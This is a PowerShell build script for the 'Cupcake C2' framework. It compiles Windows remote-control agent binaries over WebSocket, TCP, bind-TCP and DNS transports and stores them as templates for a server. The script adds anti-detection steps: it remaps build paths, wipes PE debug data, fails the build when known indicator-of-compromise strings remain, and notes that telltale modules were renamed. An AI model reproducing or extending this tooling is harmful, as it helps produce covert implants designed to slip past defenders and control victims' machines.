#requires -Version 5.1
<#
.SYNOPSIS
  Build Windows agent templates into server/assets/ (product profile: minimal).

.DESCRIPTION
  Aligns with server RebuildTemplates / builder_service:
    - cargo bin name: cupcake-agent (not legacy cupcake-core.exe)
    - sole capability tier: minimal (standard/full removed)
    - transport features: ws | tcp | tcp_bind | dns
  Optional CUPCAKE_WIRE_SEED (env or -WireSeed or config.json) for Noise/domain alignment.

.PARAMETER Profile
  product  = x64 WS/TCP/bind/DNS + tcp_minimal + x86 WS (default, matches RebuildTemplates)
  core     = x64 WS only (fast lab iterate)
  all      = product + extra aliases

.PARAMETER WireSeed
  Overrides env CUPCAKE_WIRE_SEED and config.json wire_seed for this build.

.EXAMPLE
  .\compile_windows.ps1
  .\compile_windows.ps1 -Profile core
  .\compile_windows.ps1 -WireSeed 'wire-gen-...'
#>
param(
    [ValidateSet('product', 'core', 'all')]
    [string]$Profile = 'product',

    [string]$WireSeed = '',

    [switch]$SkipTargetInstall
)

$ErrorActionPreference = 'Stop'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

$BaseDir   = Split-Path -Parent $MyInvocation.MyCommand.Path
$ClientDir = Join-Path $BaseDir 'Client'
$AssetsDir = Join-Path $BaseDir 'server\assets'
$ConfigJson = Join-Path $BaseDir 'server\config.json'

function Write-Step([string]$Msg, [string]$Color = 'Cyan') {
    Write-Host "[*] $Msg" -ForegroundColor $Color
}
function Write-Ok([string]$Msg) { Write-Host "  [OK] $Msg" -ForegroundColor Green }
function Write-Fail([string]$Msg) { Write-Host "  [!] $Msg" -ForegroundColor Red }

function Resolve-WireSeed {
    param([string]$Explicit)
    if ($Explicit) { return $Explicit.Trim() }
    if ($env:CUPCAKE_WIRE_SEED) { return $env:CUPCAKE_WIRE_SEED.Trim() }
    if (Test-Path $ConfigJson) {
        try {
            $cfg = Get-Content -Raw -Path $ConfigJson | ConvertFrom-Json
            if ($cfg.wire_seed) { return [string]$cfg.wire_seed.Trim() }
        } catch { }
    }
    return ''
}

function Ensure-RustTarget([string]$Target) {
    if ($SkipTargetInstall) { return }
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    rustup target add $Target 2>&1 | Out-Null
    $ErrorActionPreference = $prev
}

function Find-AgentBinary {
    param(
        [string]$TargetTriple
    )
    $dir = Join-Path $ClientDir "target\$TargetTriple\release"
    $candidates = @(
        'cupcake-agent.exe',
        'cupcake-core.exe'   # legacy fallback
    )
    foreach ($n in $candidates) {
        $p = Join-Path $dir $n
        if (Test-Path $p) { return $p }
    }
    return $null
}

function Build-Template {
    param(
        [string]$Arch,       # x64 | x86
        [string]$Transport,  # ws | tcp | tcp_bind | dns
        [string]$OutputName
    )

    $target = if ($Arch -eq 'x64') { 'x86_64-pc-windows-msvc' } else { 'i686-pc-windows-msvc' }
    # Product: transport + minimal only (no standard/full)
    $features = "$Transport,minimal"

    Write-Step "Building $OutputName  (arch=$Arch features=$features)"
    Ensure-RustTarget $target

    Push-Location $ClientDir
    try {
        # Strip absolute paths (project + toolchains) so PE strings lack C2-dev-main / user home.
        $repoRoot = Split-Path -Parent $ClientDir
        $cargoHome = if ($env:CARGO_HOME) { $env:CARGO_HOME } else { Join-Path $env:USERPROFILE '.cargo' }
        $rustupHome = if ($env:RUSTUP_HOME) { $env:RUSTUP_HOME } else { Join-Path $env:USERPROFILE '.rustup' }
        # Remap absolute build paths (high-signal module files were renamed: img_load / pe_img / traffic_crypto).
        $flags = @(
            "--remap-path-prefix=`"$repoRoot`"=.",
            "--remap-path-prefix=`"$ClientDir`"=.",
            "--remap-path-prefix=`"$cargoHome`"=cargo",
            "--remap-path-prefix=`"$rustupHome`"=rustup",
            "-C", "debuginfo=0"
        )
        $env:RUSTFLAGS = ($flags -join ' ')
        # Wire seed for build.rs (Noise domain / wire ids) — empty = build.rs default path
        if ($script:ResolvedWireSeed) {
            $env:CUPCAKE_WIRE_SEED = $script:ResolvedWireSeed
            $env:BUILD_WIRE_SEED = $script:ResolvedWireSeed
        }

        # cargo writes warnings to stderr; with $ErrorActionPreference=Stop that can
        # surface as a native command error even when exit code is 0 — keep building.
        $prevEap = $ErrorActionPreference
        $ErrorActionPreference = 'Continue'
        & cargo build -p cupcake-core --release --target $target `
            --no-default-features --features $features 2>&1 | ForEach-Object { "$_" }
        $cargoExit = $LASTEXITCODE
        $ErrorActionPreference = $prevEap
        if ($cargoExit -ne 0) {
            Write-Fail "cargo failed for $OutputName (exit $cargoExit)"
            exit 1
        }

        $src = Find-AgentBinary -TargetTriple $target
        if (-not $src) {
            Write-Fail "binary not found under target\$target\release (expected cupcake-agent.exe)"
            exit 1
        }

        # Wipe PE debug directory (RSDS/PDB absolute path) — strip=symbols alone is not enough.
        $stripPy = Join-Path $BaseDir 'server\scripts\pe-strip-debug.py'
        if (Test-Path $stripPy) {
            $prevEap2 = $ErrorActionPreference
            $ErrorActionPreference = 'Continue'
            if (Get-Command python -ErrorAction SilentlyContinue) {
                & python $stripPy $src 2>&1 | ForEach-Object { "$_" }
            } elseif (Get-Command py -ErrorAction SilentlyContinue) {
                & py -3 $stripPy $src 2>&1 | ForEach-Object { "$_" }
            } else {
                Write-Host "  [!] python not found — skipped pe-strip-debug" -ForegroundColor Yellow
            }
            $ErrorActionPreference = $prevEap2
        }

        # Fail closed on high-signal strings (report IoC list).
        $gate = Join-Path $ClientDir 'scripts\strings-gate.ps1'
        if (Test-Path $gate) {
            & powershell -NoProfile -File $gate -Path $src
            if ($LASTEXITCODE -ne 0) {
                Write-Fail "strings-gate failed for $OutputName"
                exit 1
            }
        }

        $dest = Join-Path $AssetsDir $OutputName
        New-Item -ItemType Directory -Force -Path $AssetsDir | Out-Null
        Copy-Item -Force -Path $src -Destination $dest
        $kb = [math]::Round((Get-Item $dest).Length / 1KB)
        Write-Ok "$OutputName  (${kb} KB)  from $(Split-Path $src -Leaf)"
    } finally {
        Pop-Location
    }
}

# ── main ────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "  =========================================" -ForegroundColor Blue
Write-Host "    Cupcake C2 - Windows Agent Templates" -ForegroundColor Blue
Write-Host "  =========================================" -ForegroundColor Blue
Write-Host ""

if (-not (Get-Command cargo -ErrorAction SilentlyContinue)) {
    Write-Fail 'Rust/cargo not found'
    exit 1
}
Write-Ok "cargo: $(cargo --version)"

$script:ResolvedWireSeed = Resolve-WireSeed -Explicit $WireSeed
if ($script:ResolvedWireSeed) {
    Write-Ok "wire_seed=$($script:ResolvedWireSeed)"
} else {
    Write-Fail "wire_seed empty — agent Noise/reg-proof will NOT match server"
    Write-Host "  Set one of:" -ForegroundColor Yellow
    Write-Host "    -WireSeed 'wire-gen-...'" -ForegroundColor Yellow
    Write-Host "    env CUPCAKE_WIRE_SEED" -ForegroundColor Yellow
    Write-Host "    server/config.json  wire_seed field" -ForegroundColor Yellow
    Write-Host "  (Without a shared seed the compiled client cannot reconnect.)" -ForegroundColor Yellow
    if ($Profile -ne 'core') {
        # Product templates must never ship with a random per-build seed
        exit 1
    }
    Write-Host "  [..] profile=core continues with ephemeral seed (lab only)" -ForegroundColor DarkYellow
}
Write-Host ""

New-Item -ItemType Directory -Force -Path $AssetsDir | Out-Null

$jobs = @()
switch ($Profile) {
    'core' {
        $jobs = @(
            @{ Arch = 'x64'; Transport = 'ws'; Out = 'client_template_windows.exe' }
        )
    }
    'product' {
        # Matches server RebuildTemplates windows rows
        $jobs = @(
            @{ Arch = 'x64'; Transport = 'ws';       Out = 'client_template_windows.exe' }
            @{ Arch = 'x86'; Transport = 'ws';       Out = 'client_template_windows_x86.exe' }
            @{ Arch = 'x64'; Transport = 'tcp';      Out = 'client_template_windows_tcp.exe' }
            @{ Arch = 'x64'; Transport = 'tcp';      Out = 'client_template_windows_tcp_minimal.exe' }
            @{ Arch = 'x64'; Transport = 'tcp_bind'; Out = 'client_template_windows_bind.exe' }
            @{ Arch = 'x64'; Transport = 'dns';      Out = 'client_template_windows_dns.exe' }
        )
    }
    'all' {
        $jobs = @(
            @{ Arch = 'x64'; Transport = 'ws';       Out = 'client_template_windows.exe' }
            @{ Arch = 'x86'; Transport = 'ws';       Out = 'client_template_windows_x86.exe' }
            @{ Arch = 'x64'; Transport = 'tcp';      Out = 'client_template_windows_tcp.exe' }
            @{ Arch = 'x64'; Transport = 'tcp';      Out = 'client_template_windows_tcp_minimal.exe' }
            @{ Arch = 'x64'; Transport = 'tcp_bind'; Out = 'client_template_windows_bind.exe' }
            @{ Arch = 'x64'; Transport = 'dns';      Out = 'client_template_windows_dns.exe' }
        )
    }
}

# Deduplicate identical transport/arch builds when multiple Out names share them
$built = @{}
foreach ($j in $jobs) {
    $key = "$($j.Arch)|$($j.Transport)"
    if ($built.ContainsKey($key)) {
        # Reuse previous binary for alias (e.g. tcp_minimal == tcp product)
        $prevOut = $built[$key]
        $srcAlias = Join-Path $AssetsDir $prevOut
        $destAlias = Join-Path $AssetsDir $j.Out
        if ((Test-Path $srcAlias) -and ($prevOut -ne $j.Out)) {
            Copy-Item -Force $srcAlias $destAlias
            Write-Ok "alias $($j.Out) <= $prevOut"
            continue
        }
    }
    Build-Template -Arch $j.Arch -Transport $j.Transport -OutputName $j.Out
    $built[$key] = $j.Out
}

Write-Host ""
Write-Host "  =========================================" -ForegroundColor Blue
Write-Host "  [DONE] profile=$Profile → $AssetsDir" -ForegroundColor Green
Get-ChildItem $AssetsDir -Filter 'client_template_windows*' |
    ForEach-Object { Write-Host ("    {0,-44} {1,8:N0} KB" -f $_.Name, ($_.Length/1KB)) }
Write-Host "  =========================================" -ForegroundColor Blue
Write-Host ""
